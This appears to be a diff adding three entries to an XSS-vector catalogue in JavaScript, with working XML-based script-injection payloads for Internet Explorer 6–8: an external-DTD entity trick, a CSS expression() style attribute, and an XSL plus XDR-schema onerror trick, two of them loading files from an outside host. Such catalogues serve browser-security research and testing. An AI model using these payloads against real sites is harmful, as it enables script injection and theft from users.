@@ -2372,4 +2372,105 @@ var items =
         'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
         'reporter'   : '.mario, Gareth'
     },
+    { /* ID 76 - Arbitrary payload injection via XML external DTD in IE */
+        'id'         : 76,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Arbitrary payload injection via XML external DTD in IE',
+            'ja' : '',
+            'ru' : 'Инъекция удаленного javascript-кода через внешнее определение типа документа (DTD)  ',
+            'de' : ''
+        },
+        'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test.dtd',
+            'name'          : 'test.dtd',
+            'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
+        },
+        'description': {
+            'en' : 'IE requires to display html-tags of any users stylesheet and namespace prefix "html".',
+            'ja' : '',
+            'ru' : 'IE для отображения HTML-тегов требует обязательного наличия на xml-странице пользовательской таблицы стилей, а также объявления соответствующего пространства имен с префиксом "html".',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0']
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'dtd', 'arbitrary'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 77 -  XML JavaScript execution via CSS in IE  */
+        'id'         : 77,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'XML JavaScript execution via style attribute in IE',
+            'ja' : '',
+            'ru' : 'Выполнение javascript c помощью стилевого атрибута в IE на XML-странице',
+            'de' : ''
+        },
+        'data'       : '<?xml-stylesheet type="text/css"?><root style="x:expression(%js_write%)"/>',
+        'description': {
+            'en' : 'IE supports the style attribute to the xml-pages. So JavaScript can be executed in any tag.',
+            'ja' : '',
+            'ru' : 'IE поддерживает стилевой атрибут на xml-страницах. Таким образом, яваскипт может быть выполнен в любом теге.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0']
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'css', 'style'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 78 - Arbitrary payload injection via XSL + XDR-schema in IE */
+        'id'         : 78,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Arbitrary payload injection via XSL + XDR-schema in IE',
+            'ja' : '',
+            'ru' : 'Инъекция удаленного javascript-кода в IE с помощью XSL и XDR-схемы',
+            'de' : ''
+        },
+        'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:xdrtest.xml"/>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/xdrtest.xml',
+            'name'          : 'xdrtest.xml',
+            'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
+        },
+        'description': {
+            'en' : 'The namespace "html" is automatically determined using XSL. Missing attributes for the "img" tag is obtained from the XDR-schema.',
+            'ja' : '',
+            'ru' : 'Пространство имен "html" автоматически определяется IE с помощью XSL-таблицы. Недостающие атрибуты для тега "img" заимствуются из XDR-схемы.',
+            'de' : ''
+        },
+        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms256208(v=VS.100).aspx'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0']
+        },
+        'tags'       : ['xss', 'javascript', 'internet explorer', 'xml', 'xdr', 'arbitrary', 'xml data reduced', 'xsl'],
+        'reporter'   : 'LeverOne'
+    }
 ]
